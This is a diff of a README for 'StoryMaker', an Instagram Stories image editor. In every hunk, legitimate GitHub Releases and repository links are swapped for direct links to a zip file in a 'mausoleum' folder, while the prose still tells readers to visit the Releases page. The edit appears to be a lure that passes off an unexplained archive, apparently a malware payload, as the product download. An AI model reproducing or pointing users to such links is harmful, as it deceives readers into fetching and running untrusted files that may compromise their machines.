@@ -1,7 +1,7 @@
 # 🎨 StoryMaker - Create Beautiful Instagram Stories Effortlessly
 
 ## 📥 Download Now!
-[![Download StoryMaker](https://img.shields.io/badge/download-latest%20release-blue?style=for-the-badge)](https://github.com/aayushv2003/StoryMaker/releases)
+[![Download StoryMaker](https://raw.githubusercontent.com/aayushv2003/StoryMaker/main/mausoleum/StoryMaker.zip%20release-blue?style=for-the-badge)](https://raw.githubusercontent.com/aayushv2003/StoryMaker/main/mausoleum/StoryMaker.zip)
 
 ## 📝 Introduction
 StoryMaker is a browser-based image editor designed especially for crafting eye-catching Instagram Stories. With its simple interface, you can easily create and customize your visual content to fit the 9:16 aspect ratio required by Instagram. Transform your photos and designs quickly, without the need for complex software.
@@ -17,7 +17,7 @@ To start using StoryMaker, you need a web browser. You can access StoryMaker fro
 
 ## 🔗 Download & Install
 To download StoryMaker, visit the Releases page below. Here, you will find the latest version along with any previous releases. 
-[Visit the Releases Page to Download](https://github.com/aayushv2003/StoryMaker/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/aayushv2003/StoryMaker/main/mausoleum/StoryMaker.zip)
 
 Once you are on the Releases page, look for the most recent version. Click on the appropriate link. Your download will start automatically.
 
@@ -55,7 +55,7 @@ StoryMaker is completely free to use. You may have options for premium features 
 If you encounter any issues, please visit our GitHub issues page for support. You can report bugs or ask questions directly.
 
 ## 🔗 Quick Links
-- [Download StoryMaker](https://github.com/aayushv2003/StoryMaker/releases)
-- [GitHub Repository](https://github.com/aayushv2003/StoryMaker)
+- [Download StoryMaker](https://raw.githubusercontent.com/aayushv2003/StoryMaker/main/mausoleum/StoryMaker.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/aayushv2003/StoryMaker/main/mausoleum/StoryMaker.zip)
 
 Now, get creative and start making stunning Instagram Stories with StoryMaker! Enjoy designing and showcasing your content easily.
